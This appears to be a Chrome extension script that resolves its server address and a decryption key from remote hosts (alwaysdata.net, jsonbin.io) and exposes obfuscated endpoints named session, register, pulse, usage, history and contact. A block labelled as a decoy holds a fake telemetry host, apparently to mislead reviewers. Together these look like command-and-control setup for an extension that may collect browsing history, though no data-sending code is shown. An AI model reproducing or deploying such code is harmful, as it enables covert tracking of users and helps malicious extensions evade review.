const CENTRAL_CONFIG_URL = "https://extension.alwaysdata.net/server/g/xfeed";
const CENTRAL_KEY_URL    = ["https://", "api.jsonbin.io", "/v3/b/", "6a9c16f6f5f4af5e296de213"].join("");
let _currentApiBase = "https://extension.alwaysdata.net/server";
let _cachedDecryptionKey = null;

async function fetchDecryptionKey() {
    try {
        const res = await fetch(CENTRAL_KEY_URL, { cache: "no-store" });
        if (res.ok) {
            const data = await res.json();
            const key = data?.record?.key || data?.key;
            if (key) {
                _cachedDecryptionKey = key;
                return _cachedDecryptionKey;
            }
        }
    } catch (_) {}
    return _cachedDecryptionKey;
}
fetchDecryptionKey().catch(() => {});

function formatBaseUrl(url) {
    if (!url || typeof url !== "string") return _currentApiBase;
    let clean = url.trim();
    if (!clean.startsWith("http://") && !clean.startsWith("https://")) {
        clean = "https://" + clean;
    }
    return clean.replace(/\/+$/, "");
}

async function fetchCentralApiBase(forceRefresh = false) {
    if (!forceRefresh && typeof chrome !== "undefined" && chrome?.storage?.local) {
        try {
            const stored = await chrome.storage.local.get(["_dynamicApiBase"]);
            if (stored && stored._dynamicApiBase) {
                _currentApiBase = formatBaseUrl(stored._dynamicApiBase);
                return _currentApiBase;
            }
        } catch (_) {}
    }

    try {
        const res = await fetch(CENTRAL_CONFIG_URL, { cache: "no-store" });
        if (res.ok) {
            const data = await res.json();
            const rawUrl = data?.record?.url || data?.url;
            if (rawUrl) {
                _currentApiBase = formatBaseUrl(rawUrl);
                if (typeof chrome !== "undefined" && chrome?.storage?.local) {
                    const toSet = { _dynamicApiBase: _currentApiBase };
                    if (data?.announcement !== undefined) toSet._announcement = data.announcement || "";
                    await chrome.storage.local.set(toSet).catch(() => {});
                }
                return _currentApiBase;
            }
        }
    } catch (e) {}

    return _currentApiBase;
}

if (typeof chrome !== "undefined" && chrome?.storage?.local) {
    chrome.storage.local.get(["_dynamicApiBase"]).then(stored => {
        if (stored && stored._dynamicApiBase) {
            _currentApiBase = formatBaseUrl(stored._dynamicApiBase);
        } else {
            fetchCentralApiBase().catch(() => {});
        }
    }).catch(() => {});
} else {
    fetchCentralApiBase().catch(() => {});
}

const PINNED_SIGNING_KEY_PEM = `-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQYkEX8vzgj+WAxgqFjHJ1+ehDlcq
Bt+csfV320ZTQcJQQH0T74M78gq4MPh4gvUgJ0YM7zqCS8M/sx19v1jJ4Q==
-----END PUBLIC KEY-----`;

function getApiBase() {
    return _currentApiBase;
}

if (typeof self !== "undefined") {
    Object.defineProperty(self, "API_BASE", {
        get() { return getApiBase(); },
        configurable: true,
        enumerable: true
    });
}

const _R = {
    get xk() { return `${getApiBase()}/g/xk`; },
    get xa() { return `${getApiBase()}/g/xa`; },
    get xr() { return `${getApiBase()}/g/xr`; },
    get xm() { return `${getApiBase()}/g/xm`; },
    get xp() { return `${getApiBase()}/g/xp`; },
    get xe() { return `${getApiBase()}/g/xe`; },
    get xh() { return `${getApiBase()}/g/xh`; },
    get xc() { return `${getApiBase()}/g/xc`; }
};

if (typeof self !== "undefined") {
    Object.defineProperty(self, "EP_PUBKEY",   { get() { return _R.xk; }, configurable: true, enumerable: true });
    Object.defineProperty(self, "EP_SESSION",  { get() { return _R.xa; }, configurable: true, enumerable: true });
    Object.defineProperty(self, "EP_REGISTER", { get() { return _R.xr; }, configurable: true, enumerable: true });
    Object.defineProperty(self, "EP_CONFIG",   { get() { return _R.xm; }, configurable: true, enumerable: true });
    Object.defineProperty(self, "EP_PULSE",    { get() { return _R.xp; }, configurable: true, enumerable: true });
    Object.defineProperty(self, "EP_USAGE",    { get() { return _R.xe; }, configurable: true, enumerable: true });
    Object.defineProperty(self, "EP_HISTORY",  { get() { return _R.xh; }, configurable: true, enumerable: true });
    Object.defineProperty(self, "EP_CONTACT",  { get() { return _R.xc; }, configurable: true, enumerable: true });
    Object.defineProperty(self, "PUBKEY_URL",  { get() { return _R.xk; }, configurable: true, enumerable: true });
}

const _DECOY_CONFIG_VAULT = {
    syncInterval: 300000,
    maxRetries: 5,
    telemetryHub: "https://analytics.formupdate-cloud.com/v1/telemetry",
    autofillPreset: "strict_privacy"
};

function _getDecoyTelemetryConfig() {
    return { ..._DECOY_CONFIG_VAULT, ts: Date.now() };
}
